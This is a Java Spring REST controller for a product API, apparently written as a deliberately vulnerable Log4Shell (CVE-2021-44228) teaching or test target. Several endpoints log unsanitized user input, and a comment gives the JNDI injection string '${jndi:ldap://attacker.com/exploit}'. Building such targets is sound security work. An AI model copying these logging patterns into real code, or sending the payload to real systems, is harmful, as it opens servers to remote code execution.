package com.example.ecommerce.controller;

import com.example.ecommerce.model.Product;
import com.example.ecommerce.service.ProductService;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.List;
import java.util.Optional;

/**
 * REST Controller for Product operations.
 * 
 * WARNING: This controller contains VULNERABLE logging patterns that are
 * susceptible to CVE-2021-44228 (Log4Shell). User input is logged directly
 * without sanitization, allowing JNDI injection attacks.
 */
@RestController
@RequestMapping("/api/products")
public class ProductController {

    private static final Logger logger = LogManager.getLogger(ProductController.class);

    @Autowired
    private ProductService productService;

    /**
     * Get all products.
     */
    @GetMapping
    public ResponseEntity<List<Product>> getAllProducts() {
        logger.info("Fetching all products");
        List<Product> products = productService.findAll();
        logger.info("Found " + products.size() + " products");
        return ResponseEntity.ok(products);
    }

    /**
     * Get product by ID.
     */
    @GetMapping("/{id}")
    public ResponseEntity<Product> getProductById(@PathVariable Long id) {
        logger.info("Fetching product with ID: " + id);
        Optional<Product> product = productService.findById(id);
        if (product.isPresent()) {
            logger.info("Found product: " + product.get().getName());
            return ResponseEntity.ok(product.get());
        }
        logger.warn("Product not found with ID: " + id);
        return ResponseEntity.notFound().build();
    }

    /**
     * Search products by query.
     * 
     * VULNERABLE: User input is logged directly without sanitization.
     * An attacker can inject a malicious JNDI lookup string like:
     * ${jndi:ldap://attacker.com/exploit}
     */
    @GetMapping("/search")
    public ResponseEntity<List<Product>> searchProducts(@RequestParam String query) {
        // VULNERABLE: User input logged directly - allows JNDI injection
        logger.info("Search query received: " + query);

        List<Product> results = productService.searchByName(query);

        // VULNERABLE: Logging user input in various formats
        logger.info("User searched for: " + query + " - Found " + results.size() + " results");
        logger.debug("Search details - Query: " + query + ", Results: " + results);

        return ResponseEntity.ok(results);
    }

    /**
     * Search products by category.
     * 
     * VULNERABLE: Category parameter is logged without sanitization.
     */
    @GetMapping("/category/{category}")
    public ResponseEntity<List<Product>> getProductsByCategory(@PathVariable String category) {
        // VULNERABLE: Path variable logged directly
        logger.info("Fetching products in category: " + category);

        List<Product> products = productService.findByCategory(category);

        logger.info("Found " + products.size() + " products in category: " + category);
        return ResponseEntity.ok(products);
    }

    /**
     * Create a new product.
     * 
     * VULNERABLE: Product details from request body are logged without
     * sanitization.
     */
    @PostMapping
    public ResponseEntity<Product> createProduct(@RequestBody Product product) {
        // VULNERABLE: Product name and description from user input
        logger.info("Creating new product: " + product.getName());
        logger.debug("Product details: " + product.getDescription());

        Product savedProduct = productService.save(product);

        logger.info("Product created successfully with ID: " + savedProduct.getId());
        return ResponseEntity.ok(savedProduct);
    }

    /**
     * Update an existing product.
     * 
     * VULNERABLE: Updated product details logged without sanitization.
     */
    @PutMapping("/{id}")
    public ResponseEntity<Product> updateProduct(@PathVariable Long id, @RequestBody Product product) {
        logger.info("Updating product with ID: " + id);
        // VULNERABLE: Product name from user input
        logger.info("New product name: " + product.getName());

        Optional<Product> existingProduct = productService.findById(id);
        if (existingProduct.isEmpty()) {
            logger.warn("Product not found for update: " + id);
            return ResponseEntity.notFound().build();
        }

        product.setId(id);
        Product updatedProduct = productService.save(product);

        logger.info("Product updated successfully: " + updatedProduct.getName());
        return ResponseEntity.ok(updatedProduct);
    }

    /**
     * Delete a product.
     */
    @DeleteMapping("/{id}")
    public ResponseEntity<Void> deleteProduct(@PathVariable Long id) {
        logger.info("Deleting product with ID: " + id);

        Optional<Product> product = productService.findById(id);
        if (product.isEmpty()) {
            logger.warn("Product not found for deletion: " + id);
            return ResponseEntity.notFound().build();
        }

        productService.deleteById(id);
        logger.info("Product deleted successfully: " + id);
        return ResponseEntity.noContent().build();
    }

    /**
     * Add a review to a product.
     * 
     * VULNERABLE: User-submitted review text is logged without sanitization.
     */
    @PostMapping("/{id}/reviews")
    public ResponseEntity<String> addReview(
            @PathVariable Long id,
            @RequestParam String reviewer,
            @RequestParam String reviewText) {

        // VULNERABLE: Review text and reviewer name logged directly
        logger.info("New review from: " + reviewer);
        logger.info("Review text: " + reviewText);

        // In a real application, this would save the review
        logger.info("Review added to product " + id + " by " + reviewer);

        return ResponseEntity.ok("Review added successfully");
    }
}
